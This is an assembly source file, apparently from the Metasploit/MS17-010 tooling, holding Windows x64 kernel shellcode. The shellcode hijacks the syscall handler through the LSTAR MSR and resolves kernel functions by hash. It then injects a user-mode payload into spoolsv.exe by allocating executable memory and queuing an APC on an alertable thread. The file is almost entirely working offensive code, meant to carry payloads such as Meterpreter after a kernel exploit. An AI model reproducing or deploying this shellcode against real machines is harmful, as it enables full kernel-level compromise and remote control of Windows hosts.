;
; Windows x86/x64 Multi-Arch Kernel Ring 0 to Ring 3 via Queued APC Shellcode
;
; Author: Sean Dillon <sean.dillon@risksense.com> (@zerosum0x0)
; Copyright: (c) 2017 RiskSense, Inc.
; Release: 04 May 2017
; License: MSF License
; Build: nasm ./kernel.asm
; Acknowledgements: Stephen Fewer, skape, Equation Group, Shadow Brokers
;
; Description:
;   Injects an APC into a specified process. Once in userland, a new thread is
;   created to host the main payload. Add whatever userland payload you want to
;   the end, prepended with two bytes that equal the little endian size of your
;   payload. The userland payload should detect arch if multi-arch is enabled.
;   This payload is convenient, smaller or null-free payloads can be crafted
;   using this as a base template.
;
; References:
;   https://github.com/Risksense-Ops/MS17-010
;   https://msdn.microsoft.com/en-us/library/9z1stfyw.aspx
;   https://zerosum0x0.blogspot.com/2017/04/doublepulsar-initial-smb-backdoor-ring.html
;   https://countercept.com/our-thinking/analyzing-the-doublepulsar-kernel-dll-injection-technique/
;   http://apexesnsyscalls.blogspot.com/2011/09/using-apcs-to-inject-your-dll.html
;

BITS 64
ORG 0
default rel

section .text
global payload_start

; options which have set values
%define PROCESS_HASH SPOOLSV_EXE_HASH ; the process to queue APC into
%define MAX_PID 0x10000
%define WINDOWS_BUILD 7601            ; offsets appear relatively stable

; options which can be enabled
%define USE_X86                       ; x86 payload
%define USE_X64                       ; x64 payload
;%define STATIC_ETHREAD_DELTA          ; use a pre-calculated ThreadListEntry
%define ERROR_CHECKS                  ; lessen chance of BSOD, but bigger size
%define SYSCALL_OVERWRITE             ; to run at process IRQL in syscall
; %define CLEAR_DIRECTION_FLAG         ; if cld should be run

; hashes for export directory lookups
LSASS_EXE_HASH                    equ      0x60795e4a   ; hash("lsass.exe")
SPOOLSV_EXE_HASH                  equ      0xdd1f77bf   ; hash("spoolsv.exe")
CREATETHREAD_HASH                 equ      0x221b4546   ; hash("CreateThread")
PSGETCURRENTPROCESS_HASH          equ      0x6211725c   ; hash("PsGetCurrentProcess")
PSLOOKUPPROCESSBYPROCESSID_HASH   equ      0x4ba25566   ; hash("PsLookupProcessByProcessId")
PSGETPROCESSIMAGEFILENAME_HASH    equ      0x2d726fa3   ; hash("PsGetProcessImageFileName")
PSGETTHREADTEB_HASH               equ      0x9d364026   ; hash("PsGetThreadTeb")
KEGETCURRENTPROCESS_HASH          equ      0x5e91685c   ; hash("KeGetCurrentProcess")
KEGETCURRENTTHREAD_HASH           equ      0x30a3ba7a   ; hash("KeGetCurrentThread")
KEINITIALIZEAPC_HASH              equ      0x4b55ceac   ; hash("KeInitializeApc")
KEINSERTQUEUEAPC_HASH             equ      0x9e093818   ; hash("KeInsertQueueApc")
KESTACKATTACHPROCESS_HASH         equ      0xdc1124e5   ; hash("KeStackAttachProcess")
KEUNSTACKDETACHPROCESS_HASH       equ      0x7db3b722   ; hash("KeUnstackDetachProcess")
ZWALLOCATEVIRTUALMEMORY_HASH      equ      0xee0aca4b   ; hash("ZwAllocateVirtualMemory")
EXALLOCATEPOOL_HASH               equ      0x9150ac26   ; hash("ExAllocatePool")
OBDEREFERENCEOBJECT_HASH          equ      0x854de20d   ; hash("ObDereferenceObject")
KERNEL32_DLL_HASH                 equ      0x92af16da   ; hash_U(L"kernel32.dll", len)

; offsets for opaque structures
%if WINDOWS_BUILD == 7601
EPROCESS_THREADLISTHEAD_BLINK_OFFSET       equ     0x308
ETHREAD_ALERTABLE_OFFSET                   equ     0x4c
TEB_ACTIVATIONCONTEXTSTACKPOINTER_OFFSET   equ     0x2c8   ; ActivationContextStackPointer : Ptr64 _ACTIVATION_CONTEXT_STACK
ETHREAD_THREADLISTENTRY_OFFSET             equ     0x420   ; only used if STATIC_ETHREAD_DELTA defined
%endif

; now the shellcode begins
payload_start:

  xor ecx, ecx
  db 0x41                   ; x86 = inc ecx, x64 = rex prefix
  loop x64_payload_start    ; dec ecx, jnz. i.e. in x64 ecx = -1, we will now jmp

BITS 32

%ifdef USE_X86
  ret
%else
  ret
%endif

x64_payload_start:
BITS 64

%ifdef SYSCALL_OVERWRITE
x64_syscall_overwrite:
  mov ecx, 0xc0000082                               ; IA32_LSTAR syscall MSR
  rdmsr
  ;movabs rbx, 0xffffffffffd00ff8
  db 0x48, 0xbb, 0xf8, 0x0f, 0xd0, 0xff, 0xff, 0xff, 0xff, 0xff
  mov dword [rbx+0x4], edx                          ; save old syscall handler
  mov dword [rbx], eax
  lea rax, [rel x64_syscall_handler]                ; load new syscall handler
  mov rdx, rax
  shr rdx, 0x20

  wrmsr
  ret

x64_syscall_handler:
  swapgs
  mov qword [gs:0x10], rsp
  mov rsp, qword [gs:0x1a8]

  push rax
  push rbx
  push rcx
  push rdx
  push rsi
  push rdi
  push rbp
  push r8
  push r9
  push r10
  push r11
  push r12
  push r13
  push r14
  push r15

  push 0x2b
  push qword [gs:0x10]
  push r11
  push 0x33
  push rcx
  mov rcx, r10
  sub rsp, 0x8
  push rbp
  sub rsp, 0x158
  lea rbp, [rsp + 0x80]

  mov qword [rbp+0xc0],rbx
  mov qword [rbp+0xc8],rdi
  mov qword [rbp+0xd0],rsi

  ;movabs rax, 0xffffffffffd00ff8
  db 0x48, 0xa1, 0xf8, 0x0f, 0xd0, 0xff, 0xff, 0xff, 0xff, 0xff

  mov rdx, rax
  shr rdx, 0x20
  xor rbx, rbx
  dec ebx
  and rax, rbx
  mov ecx, 0xc0000082
  wrmsr
  sti

  call x64_kernel_start

  cli
  mov rsp, qword [abs gs:0x1a8]
  sub rsp, 0x78
  pop r15
  pop r14
  pop r13
  pop r12
  pop r11
  pop r10
  pop r9
  pop r8
  pop rbp
  pop rdi
  pop rsi
  pop rdx
  pop rcx
  pop rbx
  pop rax
  mov rsp, qword [abs gs:0x10]
  swapgs
  jmp [0xffffffffffd00ff8]

; SYSCALL_OVERWRITE
%endif

x64_kernel_start:
; Some "globals", which should not be clobbered, these are also ABI non-volatile
; ----------------------------------------------
; r15 = ntoskrnl.exe base address (DOS MZ header)
; r14 = &x64_kernel_start
; r13 = PKAPC_STATE
; rbx = PID/PEPROCESS
; r12 = ThreadListEntry offset, later ETHREAD that is alertable
; rbp = current rsp

%ifdef CLEAR_DIRECTION_FLAG
  cld
%endif

  ; we will restore non-volatile registers
  push rsi                                          ; save clobbered registers
  push r15                                          ; r15 = ntoskernl.exe
  push r14                                          ; r14 = &x64_kernel_start
  push r13                                          ; r13 = PKAPC_STATE
  push r12                                          ; r12 = ETHREAD/offsets
  push rbx                                          ; rbx = PID/EPROCESS

  push rbp

  mov rbp, rsp                                      ; we'll use the base pointer
  and sp, 0xFFF0                                    ; align stack to ABI boundary
  sub rsp, 0x20                                     ; reserve shadow stack

  lea r14, [rel x64_kernel_start]                   ; for use in pointers

; this stub loads ntoskrnl.exe into r15
x64_find_nt_idt:
  mov r15, qword [gs:0x38]                          ; get IdtBase of KPCR
  mov r15, qword [r15 + 0x4]                        ; get ISR address
  shr r15, 0xc                                      ; strip to page size
  shl r15, 0xc

_x64_find_nt_idt_walk_page:
  sub r15, 0x1000                                   ; walk along page size
  mov rsi, qword [r15]
  cmp si, 0x5a4d                                    ; 'MZ' header
  jne _x64_find_nt_idt_walk_page

; dynamically finds the offset to ETHREAD.ThreadListEntry
find_threadlistentry_offset:

%ifdef STATIC_ETHREAD_DELTA
  mov r12, ETHREAD_THREADLISTENTRY_OFFSET
%else
  mov r11d, PSGETCURRENTPROCESS_HASH
  call x64_block_api_direct

  mov rsi, rax
  add rsi, EPROCESS_THREADLISTHEAD_BLINK_OFFSET      ; PEPROCESS->ThreadListHead

  mov r11d, KEGETCURRENTTHREAD_HASH
  call x64_block_api_direct

  mov rcx, rsi                                       ; save ThreadListHead

_find_threadlistentry_offset_compare_threads:
  cmp rax, rsi
  ja _find_threadlistentry_offset_walk_threads
  lea rdx, [rax + 0x500]
  cmp rdx, rsi
  jb _find_threadlistentry_offset_walk_threads
  sub rsi, rax
  jmp _find_threadlistentry_offset_calc_thread_exit

_find_threadlistentry_offset_walk_threads:
  mov rsi, qword [rsi]                    ; move up the list entries
  cmp rsi, rcx                            ; make sure we exit this loop at some point
  jne _find_threadlistentry_offset_compare_threads

_find_threadlistentry_offset_calc_thread_exit:
  mov r12, rsi
%endif

; now we need to find the EPROCESS to inject into
x64_find_process_name:
  xor ebx, ebx

_x64_find_process_name_loop_pid:
  mov ecx, ebx
  add ecx, 0x4
%ifdef MAX_PID
  cmp ecx, MAX_PID
  jge x64_kernel_exit
%endif

  mov rdx, r14                                      ; PEPROCESS*
  mov ebx, ecx                                      ; save current PID

  ; PsLookupProcessById(dwPID, &x64_kernel_start);
  mov r11d, PSLOOKUPPROCESSBYPROCESSID_HASH
  call x64_block_api_direct

  test eax, eax                                     ; see if STATUS_SUCCESS
  jnz _x64_find_process_name_loop_pid

  mov rcx, [r14]                                    ; rcx = *PEPROCESS

  ; PsGetProcessImageFileName(*(&x64_kernel_start));
  mov r11d, PSGETPROCESSIMAGEFILENAME_HASH
  call x64_block_api_direct

  mov rsi, rax
  call x64_calc_hash

  cmp r9d, PROCESS_HASH

  jne _x64_find_process_name_loop_pid

x64_attach_process:
  mov rbx, [r14]                          ; r14 = EPROCESS

  lea r13, [r14 + 16]
  mov rdx, r13                            ; rdx = (PRKAPC_STATE)&x64_kernel_start + 16
  mov rcx, rbx                            ; rcx = PEPROCESS

  ; KeStackAttachProcess(PEPROCESS, &x64_kernel_start + 16);
  mov r11d, KESTACKATTACHPROCESS_HASH
  call x64_block_api_direct

  ; ZwAllocateVirtualMemory
  push 0x40                                   ; PAGE_EXECUTE_READWRITE
  push 0x1000                                 ; AllocationType

  lea r9, [r14 + 8]                           ; r9 = pRegionSize
  mov qword [r9], 0x1000                      ; *pRegionSize = 0x1000

  xor r8, r8                                  ; ZeroBits = 0
  mov rdx, r14                                ; rdx = BaseAddress
  xor ecx, ecx
  mov qword [rdx], rcx                        ; set *BaseAddress = NULL
  not rcx                                     ; rcx = 0xffffffffffffffff

  ; ZwAllocateVirtualMemory(-1, &baseAddr, 0, 0x1000, 0x1000, 0x40);
  mov r11d, ZWALLOCATEVIRTUALMEMORY_HASH
  sub rsp, 0x20                               ; we have to reserve new shadow stack
  call x64_block_api_direct

%ifdef ERROR_CHECKS
  test eax, eax
  jnz x64_kernel_exit_cleanup
%endif

; rep movs kernel -> userland
x64_memcpy_userland_payload:
  mov rdi, [r14]
  lea rsi, [rel userland_start]
  xor ecx, ecx
  add cx, word [rel userland_payload_size]              ; size of payload userland
  add cx, userland_payload - userland_start             ; size of our userland
  rep movsb

; Teb loop to find an alertable thread
x64_find_alertable_thread:
  mov rsi, rbx                                          ; rsi = EPROCESS
  add rsi, EPROCESS_THREADLISTHEAD_BLINK_OFFSET         ; rsi = EPROCESS.ThreadListHead.Blink

  mov rcx, rsi                                          ; save the head pointer

_x64_find_alertable_thread_loop:
  mov rdx, [rcx]

%ifdef ERROR_CHECKS
;  todo: don't cmp on first element
;  cmp rsi, rcx
;  je x64_kernel_exit_cleanup
%endif

  sub rdx, r12                                          ; sub offset
  push rcx
  push rdx
  mov rcx, rdx

  sub rsp, 0x20
  mov r11d, PSGETTHREADTEB_HASH
  call x64_block_api_direct
  add rsp, 0x20

  pop rdx
  pop rcx

  test rax, rax                                          ; check if TEB is NULL
  je _x64_find_alertable_thread_skip_next

  mov rax, qword [rax + TEB_ACTIVATIONCONTEXTSTACKPOINTER_OFFSET]
  test rax, rax
  je _x64_find_alertable_thread_skip_next

  add rdx, ETHREAD_ALERTABLE_OFFSET
  mov eax, dword [rdx]
  bt eax, 0x5
  jb _x64_find_alertable_thread_found

_x64_find_alertable_thread_skip_next:
  mov rcx, [rcx]
  jmp _x64_find_alertable_thread_loop

_x64_find_alertable_thread_found:
  sub rdx, ETHREAD_ALERTABLE_OFFSET
  mov r12, rdx

x64_create_apc:
  ; ExAllocatePool(POOL_TYPE.NonPagedPool, 0x90);
  xor edx, edx
  add dl, 0x90
  xor ecx, ecx
  mov r11d, EXALLOCATEPOOL_HASH
  call x64_block_api_direct

  ;mov r12, rax
  ;mov r11d, KEGETCURRENTTHREAD_HASH
  ;call x64_block_api_direct

; KeInitializeApc(rcx = apc,
;                 rdx = pThread,
;                 r8 = NULL = OriginalApcEnvironment,
;                 r9 = KernelApcRoutine,
;                 NULL,
;                 InjectionShellCode,
;                 1 /* UserMode */,
;                 NULL /* Context */);
  mov rcx, rax                                ; pool APC
  lea r9, [rcx + 0x80]                        ; dummy kernel APC function
  mov byte [r9], 0xc3                         ; ret

  mov rdx, r12                                ; pThread;
  mov r12, rax                                ; save APC
  xor r8, r8                                  ; OriginalApcEnvironment = NULL

  push r8                                     ; Context = NULL
  push 0x1                                    ; UserMode
  mov rax, [r14]
  push rax                                    ; userland shellcode
  push r8                                     ; NULL

  sub rsp, 0x20
  mov r11d, KEINITIALIZEAPC_HASH
  call x64_block_api_direct

  ; KeInsertQueueApc(pAPC, NULL, NULL, NULL);
  xor edx, edx
  push rdx
  push rdx
  pop r8
  pop r9
  mov rcx, r12

  mov r11d, KEINSERTQUEUEAPC_HASH
  call x64_block_api_direct

x64_kernel_exit_cleanup:
  ; KeUnstackDetachProcess(pApcState)
  mov rcx, r13
  mov r11d, KEUNSTACKDETACHPROCESS_HASH
  call x64_block_api_direct

  ; ObDereferenceObject(PEPROCESS)
  mov rcx, rbx
  mov r11d, OBDEREFERENCEOBJECT_HASH
  call x64_block_api_direct

x64_kernel_exit:

  mov rsp, rbp                           ; fix stack

  pop rbp

  pop rbx
  pop r12
  pop r13
  pop r14
  pop r15
  pop rsi                               ; restore clobbered registers and return

  ret

userland_start:

x64_userland_start:

  jmp x64_userland_start_thread

; user and kernel mode re-use this code
x64_calc_hash:
  xor r9, r9

_x64_calc_hash_loop:
  xor eax, eax
  lodsb                                 ; Read in the next byte of the ASCII function name
  ror r9d, 13                           ; Rotate right our hash value
  cmp al, 'a'
  jl _x64_calc_hash_not_lowercase
  sub al, 0x20                          ; If so normalise to uppercase
_x64_calc_hash_not_lowercase:
  add r9d, eax                          ; Add the next byte of the name
  cmp al, ah                            ; Compare AL to AH (\0)
  jne _x64_calc_hash_loop

  ret

x64_block_find_dll:
  xor edx, edx
  mov rdx, [gs:rdx + 96]
  mov rdx, [rdx + 24]         ; PEB->Ldr
  mov rdx, [rdx + 32]         ; InMemoryOrder list

_x64_block_find_dll_next_mod:
  mov rdx, [rdx]
  mov rsi, [rdx + 80]         ; unicode string
  movzx rcx, word [rdx + 74]  ; rcx = len

  xor r9d, r9d

_x64_block_find_dll_loop_mod_name:
  xor eax, eax
  lodsb
  cmp al, 'a'
  jl _x64_block_find_dll_not_lowercase
  sub al, 0x20

_x64_block_find_dll_not_lowercase:
  ror r9d, 13
  add r9d, eax
  loop _x64_block_find_dll_loop_mod_name

  cmp r9d, r11d
  jnz _x64_block_find_dll_next_mod

  mov r15, [rdx + 32]
  ret

x64_block_api_direct:
  mov rax, r15                                        ; make copy of module

  push r9                                             ; Save parameters
  push r8
  push rdx
  push rcx
  push rsi

  mov rdx, rax
  mov eax, dword [rdx+60]                             ; Get PE header e_lfanew
  add rax, rdx
  mov eax, dword [rax+136]                            ; Get export tables RVA

%ifdef ERROR_CHECKS
  ; test rax, rax                                     ; EAT not found
  ; jz _block_api_not_found
%endif

  add rax, rdx
  push rax                                            ; save EAT

  mov ecx, dword [rax+24]                             ; NumberOfFunctions
  mov r8d, dword [rax+32]                             ; FunctionNames
  add r8, rdx

_x64_block_api_direct_get_next_func:
                              ; When we reach the start of the EAT (we search backwards), we hang or crash
  dec rcx                     ; decrement NumberOfFunctions
  mov esi, dword [r8+rcx*4]   ; Get rva of next module name
  add rsi, rdx                ; Add the modules base address

  call x64_calc_hash

  cmp r9d, r11d                             ; Compare the hashes
  jnz _x64_block_api_direct_get_next_func   ; try the next function


_x64_block_api_direct_finish:

  pop rax                     ; restore EAT
  mov r8d, dword [rax+36]
  add r8, rdx                 ; ordinate table virtual address
  mov cx, [r8+2*rcx]          ; desired functions ordinal
  mov r8d, dword [rax+28]     ; Get the function addresses table rva
  add r8, rdx                 ; Add the modules base address
  mov eax, dword [r8+4*rcx]   ; Get the desired functions RVA
  add rax, rdx                ; Add the modules base address to get the functions actual VA

  pop rsi
  pop rcx
  pop rdx
  pop r8
  pop r9
  pop r11                     ; pop ret addr

  ; sub rsp, 0x20               ; shadow space
  push r11                    ; push ret addr

  jmp rax


x64_userland_start_thread:
  push rsi
  push r15
  push rbp

  mov rbp, rsp
  sub rsp, 0x20

  mov r11d, KERNEL32_DLL_HASH
  call x64_block_find_dll

  xor ecx, ecx

  push rcx
  push rcx

  push rcx                                    ; lpThreadId = NULL
  push rcx                                    ; dwCreationFlags = 0
  pop r9                                      ; lpParameter = NULL
  lea r8, [rel userland_payload]              ; lpStartAddr = &threadstart
  pop rdx                                     ; lpThreadAttributes = NULL

  sub rsp, 0x20
  mov r11d, CREATETHREAD_HASH                 ; hash("CreateThread")
  call x64_block_api_direct                   ; CreateThread(NULL, 0, &threadstart, NULL, 0, NULL);

  mov rsp, rbp
  pop rbp
  pop r15
  pop rsi
  ret

userland_payload_size:
  db 0x01
  db 0x00

userland_payload:
  ; insert userland payload here
  ; such as meterpreter
  ; or reflective dll with the metasploit MZ pre-stub
  ret
